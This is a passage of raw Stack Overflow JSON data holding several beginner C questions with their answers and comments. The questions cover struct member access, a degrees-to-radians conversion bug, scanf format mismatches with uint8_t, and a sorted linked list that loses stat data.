"https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 0, "creation_date": 1499216710, "post_id": 44915665, "comment_id": 76807591, "body": "Please show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499216774, "post_id": 44915665, "comment_id": 76807603, "body": "That&#39;s not how <code>C</code> works. <code>Lua</code> works that way. <code>Perl</code> does something alike. But <code>C</code> is very, very different."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 0, "creation_date": 1499216783, "post_id": 44915665, "comment_id": 76807604, "body": "Provide that part of code where,  you defined your struct. Moreover, assuming that <code>&#39;a&#39;</code> will have its code <code>97</code> every machine is incorrect, instead use expressions like this, <code>j-&#39;a&#39;</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499216908, "post_id": 44915665, "comment_id": 76807632, "body": "That&#39;s an XY problem. Use an array in the <code>struct</code>."}, {"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1499217339, "post_id": 44915665, "comment_id": 76807691, "body": "Arrays and structs are two different things for two different purposes. If your problem is best solved by an array, use an array."}], "answers": [{"comments": [{"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1499217408, "post_id": 44915720, "comment_id": 76807705, "body": "If the only element of the struct is an array, you should just use a bare array instead. (I&#39;m sure you know this, but hope the OP will read my comment. Or you can edit your answer to include this caveat.)"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 1, "creation_date": 1499217814, "post_id": 44915720, "comment_id": 76807765, "body": "@Code-Apprentice: They could use a bare array, but they said they were using it to return an array, and you cannot return an array from a function. We could discuss various ways to return array contents from a function, like having the caller pass the address or doing dynamic memory allocation, but that\u2019s a can of worms for a new learner."}, {"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1499218338, "post_id": 44915720, "comment_id": 76807852, "body": "Ahhh...I missed that detail."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": -1, "last_activity_date": 1499217146, "creation_date": 1499217146, "answer_id": 44915720, "question_id": 44915665, "link": "https://stackoverflow.com/questions/44915665/having-a-struct-variable-represent-the-label/44915720#44915720", "title": "Having a struct variable represent the label", "body": "<p>In C, the names of members of structs are known to the compiler; they are used only while compiling. They are not part of the running program (except for debugging features and possible compiler-specific extensions to the language).</p>\n\n<p>A primary purpose of arrays is to work with multiple elements in a programmatic way (that is, in a way that is computed when the program is running). Subscripts are for selecting members.</p>\n\n<p>If you want to have multiple items in a struct that you can address programmatically, then you can define your struct to have an array in it, such as:</p>\n\n<pre><code>struct Foo;\n{\n    int MyArray[10];\n}\n\u2026\nstruct Foo MyFoo;\n</code></pre>\n\n<p>Then you can refer to items in the array inside <code>MyFoo</code> with <code>MyFoo.MyArray[i]</code>. You will have to use numbers for subscripts.</p>\n"}, {"tags": [], "owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "is_accepted": false, "score": 0, "last_activity_date": 1499217734, "creation_date": 1499217734, "answer_id": 44915776, "question_id": 44915665, "link": "https://stackoverflow.com/questions/44915665/having-a-struct-variable-represent-the-label/44915776#44915776", "title": "Having a struct variable represent the label", "body": "<p><code>struct</code> and <code>array</code> are two different animals and you should use the one which is most appropriate for the job. An <code>array</code> is meant to store a list of elements all of the same type. The elements of an array are accessed by a numeric index, so there is an ordering to the elements. On the other hand, a <code>struct</code> is intended to hold related data which may be of different types. You access the members of a struct by name. This allows us to ignore the order of the elements.</p>\n\n<p>Granted, you can have an array inside a <code>struct</code>, but unless there are other data elements in the <code>struct</code> as well, you should just use a bare array instead of a <code>struct</code> with an array member.</p>\n"}], "owner": {"reputation": 13, "user_id": 6096089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a2262c998baa1ef85875844b8a4944c?s=128&d=identicon&r=PG&f=1", "display_name": "almo121", "link": "https://stackoverflow.com/users/6096089/almo121"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 44915720, "answer_count": 2, "score": -1, "last_activity_date": 1499217734, "creation_date": 1499216451, "question_id": 44915665, "link": "https://stackoverflow.com/questions/44915665/having-a-struct-variable-represent-the-label", "title": "Having a struct variable represent the label", "body": "<p>I'm really new to c and was using a struct to return an array, I managed to generate the struct just fine and use the struct as well, but I made a really ugly way of importing my array into my struct. Is there some way that I can do this with a for loop?</p>\n\n<p>Here's my code that I currently use to transfer the array into the struct:</p>\n\n<pre><code>result.a = input3[0];\nresult.b = input3[1];\nresult.c = input3[2];\nresult.d = input3[3];\nresult.e = input3[4];\nresult.f = input3[5];\nresult.g = input3[6];\nresult.h = input3[7];\nresult.i = input3[8];\n</code></pre>\n\n<p>I tried to have it work like this:</p>\n\n<pre><code>for (char j = 'a'; j &lt;= 'i'; j++)\n{\n    result.j = input[j - 97];\n}\n</code></pre>\n\n<p>But, as makes sense, the error I get is 'j': is not a member of values and it refuses to compile. What formatting would it take to make the program realize that I'm trying to refrence a variable, and not the index of the struct?\nThanks!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499211676, "post_id": 44915225, "comment_id": 76806676, "body": "&quot;I saw in gdb: y doesn&#39;t change.&quot; You are not changing <code>y</code> but what it points to with <code>*y</code>."}, {"owner": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1499211708, "post_id": 44915225, "comment_id": 76806683, "body": "@WeatherVane that&#39;s exactly what he&#39;s looking at in GDB"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499211815, "post_id": 44915225, "comment_id": 76806705, "body": "Not what was asked. <code>y</code> does not change."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1499212284, "post_id": 44915225, "comment_id": 76806789, "body": "<code>*y</code> is an <code>int</code> value. Perhaps the <code>float</code> change is too small to register. Show some example values. And why are you still using <code>float</code> in the 22nd century?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499212869, "post_id": 44915225, "comment_id": 76806899, "body": "@WeatherVane: my hypothesis: <code>scanf(&quot;%f&quot;, &amp;float_var)</code> is easy to get right; remembering to use <code>scanf(&quot;%lf&quot;, &amp;double_var)</code> is harder.  Once upon a time, it might have been for novelty&#39;s sake \u2014 pre-standard C did all floating point arithmetic in <code>double</code>, of course."}, {"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 1, "creation_date": 1499213055, "post_id": 44915225, "comment_id": 76806941, "body": "Coincidence?  &quot;6.44245094e+09&quot; is a valid way to print <code>0x180000000</code>.  But that would still change a 32-bit <code>int</code>."}], "answers": [{"tags": [], "owner": {"reputation": 4319, "user_id": 2027237, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6457db0676be7f14f63e0f45aec333d?s=128&d=identicon&r=PG", "display_name": "anneb", "link": "https://stackoverflow.com/users/2027237/anneb"}, "is_accepted": true, "score": 2, "last_activity_date": 1499212507, "creation_date": 1499212507, "answer_id": 44915325, "question_id": 44915225, "link": "https://stackoverflow.com/questions/44915225/why-this-line-do-nothing/44915325#44915325", "title": "Why this line do nothing", "body": "<p>To convert degrees to radians you should:</p>\n\n<pre><code>d = (d / 360.0) * 6.283185307179586;\n</code></pre>\n\n<p>Your conversion function results in very small values which for sin() may not change the integer value of y and for cos() result in larger values for x</p>\n"}], "owner": {"reputation": 25, "user_id": 8210220, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6BaYF.jpg?s=128&g=1", "display_name": "ZarWare", "link": "https://stackoverflow.com/users/8210220/zarware"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 44915325, "answer_count": 1, "score": -2, "last_activity_date": 1499212507, "creation_date": 1499211509, "question_id": 44915225, "link": "https://stackoverflow.com/questions/44915225/why-this-line-do-nothing", "title": "Why this line do nothing", "body": "<p>I am experimenting with some trigonometric functions, the code compile good, i want see a square moving on the 360 degrees, but when i run the code i see the square only move in the x-axis, everything work fine except a line on my function.</p>\n\n<pre><code>void mvdr(int* x, int* y, float d, float sp)\n{\n    if(d != 0)\n        d = (d / 360.0) / 6.283185307179586;\n\n    *x += cos(d)*sp;\n    *y += sin(d)*sp; // here's the error\n}\n</code></pre>\n\n<p>I saw in gdb: <code>y</code> doesn't change.</p>\n\n<pre><code>(gdb) n\n11       *y += sin(d)*sp; // here's the error\n(gdb) p d\n$4 = 0.000442097051\n(gdb) p sin(d)*sp\n$5 = 6.44245094e+09\n(gdb) p *y\n$6 = 256\n(gdb) n\n12       }\n(gdb) p *y\n$7 = 256\n</code></pre>\n\n<p>I can't understand what is happening or if i did something wrong, i hope you can help me.</p>\n"}, {"tags": ["c", "integer", "scanf"], "comments": [{"owner": {"reputation": 9215, "user_id": 5212827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7e9f9b0d7e2d571c9f8886dd54bd50f9?s=128&d=identicon&r=PG&f=1", "display_name": "DeiDei", "link": "https://stackoverflow.com/users/5212827/deidei"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 0, "creation_date": 1499209930, "post_id": 44915001, "comment_id": 76806329, "body": "@PatrickRoberts It isn&#39;t?"}, {"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 0, "creation_date": 1499209990, "post_id": 44915001, "comment_id": 76806340, "body": "Nevermind, apparently I&#39;m wrong."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1499209993, "post_id": 44915001, "comment_id": 76806341, "body": "<code>scanf(&quot;%d&quot;, &amp;numatoms);</code> --&gt; <code>scanf(&quot;%&quot; SCNu8, &amp;numatoms);</code> (<code>&lt;inttypes.h&gt;</code>)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499298429, "post_id": 44915001, "comment_id": 76851678, "body": "for ease of readability and understanding: 1) consistently indent the code.  Indent after every opening brace &#39;{&#39;. unindent before every closing brace &#39;}&#39;.  Suggest each indent level by 4 spaces.  2) separate code blocks (for, if, else, while, do...while, switch, case, default) via a single blank line."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499298505, "post_id": 44915001, "comment_id": 76851697, "body": "when outputting a prompt to the user, there is no need to flush stdout.  the act of calling an input function <code>scanf()</code> will cause the prompt to be displayed."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499298604, "post_id": 44915001, "comment_id": 76851719, "body": "when compiling, always enable all the warnings, then fix those warnings.  (for <code>gcc</code>, at a minimum use: <code>-Wall -Wextra -pedantic -std=gnu11</code>  I also use: <code>-Wconversion</code> )"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499298639, "post_id": 44915001, "comment_id": 76851735, "body": "when the <code>main()</code> function parameters will not be used, use the signature: <code>int main( void )</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499298720, "post_id": 44915001, "comment_id": 76851751, "body": "when calling any of the <code>scanf()</code> family of functions, always check the returned value (not the parameter values) to assure the operation was successful."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499299094, "post_id": 44915001, "comment_id": 76851826, "body": "the variable <code>numatoms</code> is declared as <code>unsigned char</code> but the &quot;%d&quot; in the <code>scanf()</code> function is expecting a &#39;int&#39;, so will corrupt the bytes following the variable <code>numatoms</code>  Similar considerations for variable <code>r</code>.  the declarations allow a range of input values from 0...255.  Strongly suggest changing those declarations from <code>uint8_t</code> to <code>unsigned int</code> and using &quot;%u&quot; in the scanf() format strings"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499299310, "post_id": 44915001, "comment_id": 76851872, "body": "regarding this statement: <code>scanf(&quot;%s&quot;, a);</code>  1) always check the returned value 2) only need a single char, not a string. 3) use <code>tolower()</code> from header file: <code>stype.h</code> to set the value input to lower case, then only one expression needed in the <code>while()</code> statement. 4) when using the input/format specifier &#39;%s&#39;, always include a MAX CHARACTERS modifier that is only less than the length of the input buffer to avoid buffer overflow (I.E. undefined behavior) which can lead to a seg fault event."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499299573, "post_id": 44915001, "comment_id": 76851930, "body": "when prompting the user for input, always tell the user the range limits.  The array &#39;a[]&#39; is not a meaningful name.  variable names should indicate <code>content</code> or <code>usage</code> (or better, both).  Suggest <code>char choice;</code> and use &#39;%c&#39; in the scanf() statement (or better call <code>getchar()</code>"}, {"owner": {"reputation": 117, "user_id": 1160866, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26929c17f57cc8d87c5a477df963cdab?s=128&d=identicon&r=PG", "display_name": "user1160866", "link": "https://stackoverflow.com/users/1160866/user1160866"}, "edited": false, "score": 0, "creation_date": 1499314929, "post_id": 44915001, "comment_id": 76855600, "body": "Thanks for all the great information. Truly above and beyond.  In my defense about the variable names such as &#39;a&#39; and &#39;r&#39;, this is a reproduction of one of the first programs I was exposed to.  It is called &quot;Blackbox&quot; by Jeff Kenton of Creative Computing 1978. In My attempt at conversion from Microsoft BASIC to C I wanted to preserve the original &quot;feel&quot; and integrity of his work.  I changed &#39;numatoms&#39; back to &#39;n&#39; when I finished.  Thanks again to you guys  and thanks to Jeff and Creative Computing."}], "answers": [{"tags": [], "owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "is_accepted": false, "score": 4, "last_activity_date": 1499210006, "creation_date": 1499210006, "answer_id": 44915036, "question_id": 44915001, "link": "https://stackoverflow.com/questions/44915001/variable-is-losing-its-value-in-c-program/44915036#44915036", "title": "variable is losing its value in c program", "body": "<p><code>uint8_t</code> is 8 bits long <code>%u</code> reads an unsigned int (probably 32 bits long). </p>\n\n<p>You either need to make <code>numatoms</code> \"bigger\" (i.e. <code>unsigned int</code>) or read the correct size (see <a href=\"https://stackoverflow.com/questions/23748257/scanf-cant-scan-into-inttypes-uint8-t\">scanf can&#39;t scan into inttypes (uint8_t)</a>)</p>\n"}, {"comments": [{"owner": {"reputation": 117, "user_id": 1160866, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26929c17f57cc8d87c5a477df963cdab?s=128&d=identicon&r=PG", "display_name": "user1160866", "link": "https://stackoverflow.com/users/1160866/user1160866"}, "edited": false, "score": 0, "creation_date": 1499214938, "post_id": 44915287, "comment_id": 76807302, "body": "I love this site. so to be clear, it was really the scanf(&quot;%u&quot;, &amp;r); line that was &quot;overwritting&quot; the &#39;numatoms&#39; location do to scanf being unable to limit to one byte.  &#39;numatoms&#39; is getting set correctly by its scanf() (although should also be fixed), it&#39;s the second scanf() that is messing things up."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 117, "user_id": 1160866, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26929c17f57cc8d87c5a477df963cdab?s=128&d=identicon&r=PG", "display_name": "user1160866", "link": "https://stackoverflow.com/users/1160866/user1160866"}, "edited": false, "score": 0, "creation_date": 1499217708, "post_id": 44915287, "comment_id": 76807744, "body": "@user1160866 The problem is the same with the both calls of scanf. As result the memory around the variables is overwritten."}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 2, "last_activity_date": 1499212104, "creation_date": 1499212104, "answer_id": 44915287, "question_id": 44915001, "link": "https://stackoverflow.com/questions/44915001/variable-is-losing-its-value-in-c-program/44915287#44915287", "title": "variable is losing its value in c program", "body": "<p>You should use macros for format specifiers for integer types defined in the header <code>&lt;inttypes.h&gt;</code>. </p>\n\n<p>From the C Standard (7.8.1 Macros for format specifiers)</p>\n\n<blockquote>\n  <p>1 Each of the following object-like macros expands to a character\n  string literal containing a conversion specifier, possibly modified by\n  a length modifier, suitable for use within the format argument of a\n  formatted input/output function when converting the corresponding\n  integer type. These macro names have the general form of PRI\n  (character string literals for the fprintf and fwprintf family) or SCN\n  (character string literals for the fscanf and fwscanf family),217)\n  followed by the conversion specifier, followed by a name corresponding\n  to a similar type name in 7.20.1. In these names, N represents the\n  width of the type as described in 7.20.1.</p>\n</blockquote>\n\n<p>The general form of the macro used for unsigned integer types with the conversion specifier <code>u</code> looks like</p>\n\n<pre><code>SCNuN\n</code></pre>\n\n<p>Here is a demonstrative program</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;inttypes.h&gt;\n\nint main(void) \n{\n    uint8_t x;\n\n    scanf( \"%\" SCNu8, &amp;x );\n\n    printf( \"x = %u\\n\", x );\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 117, "user_id": 1160866, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26929c17f57cc8d87c5a477df963cdab?s=128&d=identicon&r=PG", "display_name": "user1160866", "link": "https://stackoverflow.com/users/1160866/user1160866"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 462, "favorite_count": 0, "accepted_answer_id": 44915287, "answer_count": 2, "score": 0, "last_activity_date": 1499217581, "creation_date": 1499209681, "last_edit_date": 1499217581, "question_id": 44915001, "link": "https://stackoverflow.com/questions/44915001/variable-is-losing-its-value-in-c-program", "title": "variable is losing its value in c program", "body": "<p>This is written in 'c' and compiled with gcc.  I'm not sure what else you need to know.</p>\n\n<p>The smallest complete example I could put together is shown here.  The variable 'numatoms' loses its value when it gets to line 23 (after the scanf()).</p>\n\n<p>I'm stumped. Maybe it has something to do with scanf() overwritting the space for numatoms?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\n/*\n * \n */\nint main(int argc, char** argv) {\nuint8_t numatoms;\nuint8_t r;\nchar a[20];\n\ndo {\n    printf(\"NO. OF ATOMS?\");\n    fflush(stdout);\n    scanf(\"%d\", &amp;numatoms);\n    printf(\"\\r\\n\");\n    for(;;){\n        printf(\"value of numatoms is %u\\r\\n\", numatoms);\n        printf(\"RAY?\");\n        fflush(stdout);\n        scanf(\"%u\", &amp;r);\n        printf(\"value of numatoms is %u\\r\\n\", numatoms);\n        if(r &lt; 1)\n            break;\n        else {\n            printf(\"value of numatoms is %u\\r\\n\", numatoms);\n        }\n    }\n    printf(\"CARE TO TRY AGAIN?\");\n    fflush(stdout);\n    scanf(\"%s\", a); \n    printf(\"\\r\\n\");           \n} while (a[0] == 'y' || a[0] == 'Y');\n\nreturn (EXIT_SUCCESS);\n</code></pre>\n\n<p>}</p>\n"}, {"tags": ["c", "unix", "linked-list", "stat"], "comments": [{"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1499210315, "post_id": 44914979, "comment_id": 76806411, "body": "That naming convention (t_ls) is horrible. Man it makes your code hard to read!"}, {"owner": {"reputation": 5867, "user_id": 2252087, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/020cbe41b02f03d59f3adae022c0ce7d?s=128&d=identicon&r=PG", "display_name": "ensc", "link": "https://stackoverflow.com/users/2252087/ensc"}, "edited": false, "score": 2, "creation_date": 1499210917, "post_id": 44914979, "comment_id": 76806516, "body": "<code>stock-&gt;next</code> is unitialized"}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 8185086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67159d6a04157a0a8f572a8a4e27d378?s=128&d=identicon&r=PG&f=1", "display_name": "Lazare Rossillon", "link": "https://stackoverflow.com/users/8185086/lazare-rossillon"}, "edited": false, "score": 0, "creation_date": 1499257613, "post_id": 44915221, "comment_id": 76827836, "body": "Wow, thank you so much ! Now that I&#39;ve seen it, it was quite obvious. Thank you for your time !!"}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 0, "last_activity_date": 1499212424, "last_edit_date": 1499212424, "creation_date": 1499211469, "answer_id": 44915221, "question_id": 44914979, "link": "https://stackoverflow.com/questions/44914979/value-of-stat-structure-contained-structure-lost/44915221#44915221", "title": "Value of stat structure contained structure lost", "body": "<p>The trouble is that <code>ft_add_elem()</code> returns the pointer to the first item in the list, not the item just added.  You're keeping the list in sorted order (via the <code>ft_strcmp()</code> function).  So, you keep running <code>stat()</code> on the first name in the list \u2014 which will be <code>.</code> unless you've some unusual files in your (current) directory.</p>\n\n<p>Fixing that is a bit more intricate.  It's probably best to do the <code>stat()</code> operation in <code>ft_add_elem()</code>.  Note, however, that you also have to worry about the path to the directory from which you're reading the entries.  If you're processing <code>.</code> (the current directory) only, then it'll work.  If you're processing other directories, you have to create the path to the file by prefixing the directory name to the file name.</p>\n\n<p>It's also worth ensuring that the new element is fully initialized; it avoids accidentally undefined behaviour.</p>\n\n<p>Here's some fixed code.  The functions with names starting <code>err_</code> are available from Github (<a href=\"https://github.com/jleffler/soq/tree/master/src/libsoq\" rel=\"nofollow noreferrer\">https://github.com/jleffler/soq/tree/master/src/libsoq</a>) in <code>stderr.c</code> and <code>stderr.h</code>.  They're used to simplify error reporting.</p>\n\n<pre><code>#include \"stderr.h\"\n#include &lt;dirent.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n\n#define ft_strcmp(s, t) strcmp(s, t)\n#define ft_strdup(s)    strdup(s)\n\ntypedef struct      s_ls\n{\n    char            *name;\n    struct          stat stat;\n    struct          s_ls *next;\n}                       t_ls;\n\nstatic t_ls *ft_new_elem(char *name)\n{\n    t_ls    *tmp;\n    if (!(tmp = malloc(sizeof(t_ls))))\n        err_error(\"Failed to allocate %zu bytes of memory\\n\", sizeof(*tmp));\n    tmp-&gt;name = ft_strdup(name);\n    tmp-&gt;next = 0;\n    tmp-&gt;stat = (struct stat){ 0 };\n    return(tmp);\n}\n\nstatic t_ls *ft_add_elem(char *name, const char *dirname, t_ls *stock)\n{\n    t_ls *new;\n    t_ls *check;\n\n    new = ft_new_elem(name);\n    if (!stock)\n        return(new);\n    check = stock;\n    while (check &amp;&amp; check-&gt;next 